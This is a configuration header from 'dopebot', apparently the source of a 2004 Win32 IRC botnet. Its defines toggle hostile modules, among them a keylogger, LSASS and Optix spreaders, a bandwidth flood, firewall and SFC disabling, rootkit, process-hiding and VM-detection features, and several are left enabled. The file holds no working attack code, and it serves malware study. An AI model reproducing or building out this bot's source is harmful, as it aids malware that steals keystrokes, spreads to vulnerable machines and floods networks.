/*	dopebot - a modular IRC bot for Win32
	Copyright (C) 2004 dope

	This program is free software; you can redistribute it and/or
	modify it under the terms of the GNU General Public License
	as published by the Free Software Foundation; either version 2
	of the License, or (at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program; if not, write to the Free Software
	Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA  02111-1307, USA. */

//Defines
//-----------------------------------------------------------------
//#define NO_DEBUG			//Disable Debug Functions
#define NO_CRYPTO			//Disable Crypto Functions
//#define NO_DOWNLOAD		//Disable Download Functions
//#define NO_FILE			//Disable File Functions
#define NO_INSTALL		//Disable Install Functions
//#define NO_KEYLOGGER		//Disable Keylogger Functions
//#define NO_MELT			//Disable Melt Function
//#define NO_NETINFO		//Disable Network Info Functions
//#define NO_REGISTRY		//Disable Registry Functions
//#define NO_SERVICE		//Disable Service Functions
//#define NO_SNIFFER		//Disable Sniffer Functions
//#define NO_SYSINFO		//Disable System Info Functions
//#define NO_TOPIC			//Disable Topic Command Function
//-----------------------------------------------------------------
#define NO_FWB			//Disable Firewall Bypass Functions
#define NO_INJECTION		//Disable Library Injection Function
//-----------------------------------------------------------------
#define NO_SFC			//Disable SFC Disabling And Patching Functions
//-----------------------------------------------------------------
#define NO_9XHIDEPROC		//Disable Windows 9X Hide Process Function
#define NO_KERNELKIT		//Disable Kernel Kit Function
#define NO_REGPORT		//Disable Register Port Function
#define NO_SP2BYPASS	//Disable Windows XP SP2 Firewall Disable Function
#define NO_USERKIT		//Disable User Kit Function
//-----------------------------------------------------------------
#define NO_DEBUGCHK		//Disable Debugger Check Function
#define NO_REGSECURE		//Disable Registry Secure Function
#define NO_SECURE			//Disable Secure Function
#define NO_VMDETECT			//Disable Virtual Machine Detection Funtion
//-----------------------------------------------------------------
#define NO_FTPD			//Disable FTPD
//#define NO_IDENTD			//Disable IDENTD
//#define NO_TFTPD			//Disable TFTPD
//-----------------------------------------------------------------
//#define NO_BANDWITH		//Disable Bandwith Flood
//-----------------------------------------------------------------
//#define NO_SCANNER		//Disable Scanner Functions
//#define NO_LSASS			//Disable LSASS Spreader
//#define NO_OPTIX			//Disable Optix Spreader

#define ARRAYSIZE(X) (sizeof(X) / sizeof(X[0]))
#define MASBUF 4096
#define BIGBUF 1024
#define IRCBUF 512
#define MEDBUF 256
#define LOWBUF 128